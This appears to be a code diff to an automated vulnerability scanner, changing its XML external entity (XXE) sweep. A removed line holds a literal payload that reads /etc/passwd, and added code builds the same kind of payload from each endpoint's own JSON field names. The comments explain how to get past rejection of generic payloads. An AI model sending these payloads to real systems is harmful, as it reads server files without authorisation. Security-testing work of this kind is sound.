@@ -21,7 +21,7 @@ import {
 import { buildHunterBrief, openAuthenticatedClasses, deriveOrigins, resolveRelativeEndpoint } from "./brief.js";
 import { runSweep, renderSweepLeads, SWEEP_PAYLOADS, detectDebugSignature, renderEndpointFor, type SendProbe, type SweepHit } from "./sweep.js";
 import { readArtifactRecords, deriveTargets, setAtPath, type SweepTargetWithBody } from "./sweep-targets.js";
-import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, type FieldMap } from "./stateful.js";
+import { mapFields, looksLikeLogin, looksLikePasswordChange, extractJwt, classifyContactField, extractAssignedId, findDeviceObject, graftDevice, buildXxeXml, type FieldMap } from "./stateful.js";
 
 // Re-exported for backward compatibility: existing callers (and test/beat.test.ts)
 // import these from beat.js. The vocabulary itself now lives in vuln-classes.ts so
@@ -561,8 +561,6 @@ async function sweepBrokenPasswordChange(
  * capture so the caller can verify body_contains the /etc/passwd signature. */
 async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, _sessionLabel?: string): Promise<Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }>> {
   const hits: Array<SweepHit & { exploit?: HttpCapture; control?: HttpCapture }> = [];
-  const xml = `<?xml version="1.0"?><!DOCTYPE r [<!ENTITY sahwx SYSTEM "file:///etc/passwd">]><r><x>&sahwx;</x></r>`;
-  const benign = `<?xml version="1.0"?><r><x>sahwbenignxml</x></r>`;
   // Content-Type variants: some stacks parse XML only under text/xml, others application/xml.
   // Accept: application/xml is the F-21 trigger (the endpoint switches to an XML handler).
   const hdrVariants: Record<string, string>[] = [
@@ -575,13 +573,17 @@ async function sweepXxe(targets: SweepTargetWithBody[], runner: ToolRunner, _ses
     if (t.method !== "POST" && t.method !== "PUT" && t.method !== "PATCH") continue;
     if (!t.bodyTemplate) continue;
     n++;
+    // Build the XXE body from THIS endpoint's OWN JSON field names: the app parses XML into
+    // the same field elements it expects as JSON and reflects only a field it recognizes,
+    // so a generic <x>&xxe;</x> is rejected (CTS002) while <name>&xxe;</name> is echoed.
+    const jsonLeaves = t.params.filter((p) => t.paramKind[p] === "json");
+    const xml = buildXxeXml(jsonLeaves);
+    const benign = buildXxeXml(jsonLeaves).replace(/&xxe;/g, "sahwbenignxml").replace(/<!DOCTYPE[^>]*>/, "");
     // XXE here is UNAUTHENTICATED (F-21 is auth=none, and a session can route the request
     // to a different handler that never parses XML — the likely cause of prior 0/52 runs).
     const mk = (url: string, body: string, hdr: Record<string, string>): Record<string, unknown> =>
       ({ method: t.method, url, headers: hdr, body });
-    // Try the canonical route AND its /index variant, across the header variants. A
-    // CodeIgniter app often parses XML only on the default-method /index path; a hit there
-    // records under the canonical endpoint (canonicalizeEndpoint strips /index).
+    // Try the canonical route AND its /index variant, across the header variants.
     const urlVariants = [t.endpoint, `${t.endpoint.replace(/\/$/, "")}/index`];
     let exploit: HttpCapture | undefined; let hitUrl = t.endpoint; let hitHdr = hdrVariants[0];
     outer: for (const hdr of hdrVariants) {
